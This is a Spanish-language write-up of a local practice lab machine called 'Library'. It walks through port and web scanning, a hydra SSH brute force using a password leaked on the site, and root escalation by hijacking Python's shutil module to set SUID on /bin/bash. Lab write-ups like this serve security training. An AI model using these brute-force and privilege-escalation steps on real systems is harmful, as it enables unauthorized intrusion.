- Tags: #Library 
---
[Maquina Library](https://mega.nz/file/hTdiWDQI#ghcFj2GLskvbvfIpn4OppMvu-AX29pUvbFqYy1927IA) ==> Enlace de descarga al laboratorio.
```bash
7z x library.zip # Descomprimimos el archivo 
sudo bash auto_deploy.sh library.tar # Desplegamos el laboratoriio
```

#### Fase Reconocimiento:
```bash
172.17.0.2 --> Direccion ip del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conexion con el target

wichSystem.py 172.17.0.2 # Determinando que estamos ante una maquina Linux
172.17.0.2 (ttl -> 64): Linux
```

#### Fase Reconocimiento puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos desubrimiento de puertos
extractPorts allPorts # Parseamos la informacion mas importante del primer escaneo
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar los servicios y la version que corren detras de estos puertos.
```

**( 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0) )** ==> Detectamos un servicio ssh expuesto
**( 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu)) )** ==> Detectamos un servicio web expuesto y Por el **codeName** estamos ante una version de **ubuntuNoble**

#### Fase Reconocimiento Web:
```bash
whatweb http://172.17.0.2/ # Detectamos tecnologias que esta usando la web
http://172.17.0.2/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[Apache2 Ubuntu Default Page: It works]

nmap -p80 --script http-enum 172.17.0.2 # No detecta nada critico
```

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,html,php.back,back,txt,zip,tar,pdf # Detectamos potenciales archivos.
/index.php            (Status: 200) [Size: 26] # Auditaremos este
/index.html           (Status: 200) [Size: 10671]
```

**( JIFGHDS87GYDFIGD )** ==> En la web esta filtrado esto que parece ser una password. de un usuario el cual tendremos que intentar descubrir con un ataque de fuerza bruta
```bash
 hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD -t 4 -f ssh://172.17.0.2 # 
 [22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD
``` 

#### Fase Intrusion:
```bash
ssh-keygen -R 172.17.0.2 && ssh carlos@172.17.0.2
```

#### Fase Escalada Privilegios:
```bash
sudo -l
User carlos may run the following commands on bfb724958d7a: # Tenemos una via potencial de escalar privielgios.
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

```bash
export PATH=/opt:$PATH # Modificamos nuestro pad para poder secuestrar la libreria shutil que usa ese script.py al ejecutarse.
```

**shutil.py** ==> Crearemos un archivo igual que el nombre de la libreria para que sea buscado primero en: **( /opt )** y sea ejecutado aunque falle el script lograremos que se otroguen privilegios **SUID** a la bash.
```bash
import os;
os.system("chmod u+s /bin/bash")
```
---
```bash
sudo -u root /usr/bin/python3 /opt/script.py # Ejecutamos este archivo y nos muestra que esta mal pero hemos logrado cambiarle los pribilegios a la bash

ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash

/bin/bash -p # Ahora obtendremos una bash como root obteniendo control total sobre el sistema operativo.
```